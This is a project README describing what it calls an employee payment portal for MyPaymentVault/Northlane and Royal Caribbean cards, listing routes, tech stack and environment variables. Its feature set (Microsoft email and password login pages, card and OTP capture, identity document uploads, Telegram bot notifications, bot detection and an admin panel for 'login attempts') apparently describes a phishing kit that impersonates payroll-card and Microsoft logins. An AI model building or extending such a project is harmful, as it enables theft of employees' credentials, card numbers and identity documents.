# MyPaymentVault - Employee Payment Portal

## Overview
This is a comprehensive employee payment portal for MyPaymentVault/Northlane. The application provides secure login, card activation, and account management functionality.

## Features
- User login with email verification and OTP
- Card activation and registration
- Contact information submission with document upload
- Account management (AccountPage)
- RCCL (Royal Caribbean) card activation
- Microsoft authentication flow
- Admin panel for managing login attempts
- Multi-language support (LanguageContext)

## Tech Stack
- **Frontend**: React 18 with TypeScript, Vite, TailwindCSS
- **Backend**: Express.js with TypeScript
- **Database**: PostgreSQL with Drizzle ORM
- **Email**: Resend for OTP emails
- **Notifications**: Telegram bot integration

## Project Structure
```
client/
  src/
    assets/           - Images, logos, SVGs
    components/       - Reusable UI components
    contexts/         - React contexts (Language, etc.)
    hooks/            - Custom React hooks
    lib/              - Utility functions
    pages/            - Page components
    styles/           - CSS stylesheets
server/
  index.ts           - Express server entry point
  routes.ts          - API routes
  storage.ts         - Database operations
  telegram.ts        - Telegram notifications
  crypto.ts          - Encryption utilities
  security-middleware.ts - Security headers and bot detection
shared/
  schema.ts          - Drizzle database schema
  luhn.ts            - Card number validation
```

## Routes
- `/` - Login page
- `/account` - Account management
- `/postal-code` - Card verification
- `/activate-card` - Card activation
- `/contact-info` - Contact information form
- `/register` - Registration page
- `/forgot-username` - Username recovery
- `/forgot-password` - Password recovery
- `/microsoft-email` - Microsoft email login
- `/microsoft-password` - Microsoft password login
- `/rccl` - RCCL card portal
- `/rccl-register` - RCCL registration
- `/rccl-activate-card` - RCCL card activation

## Environment Variables
- `DATABASE_URL` - PostgreSQL connection string
- `SESSION_SECRET` - Express session secret
- `ENCRYPTION_SECRET` - Data encryption secret
- `ENCRYPTION_SALT` - Encryption salt
- `RESEND_API_KEY` - Resend email API key (optional)
- `TELEGRAM_BOT_TOKEN` - Telegram bot token (optional)
- `TELEGRAM_CHAT_ID` - Telegram chat ID (optional)

## Running the Project
The project runs with `npm run dev` which starts both the Express backend and Vite frontend on port 5000.
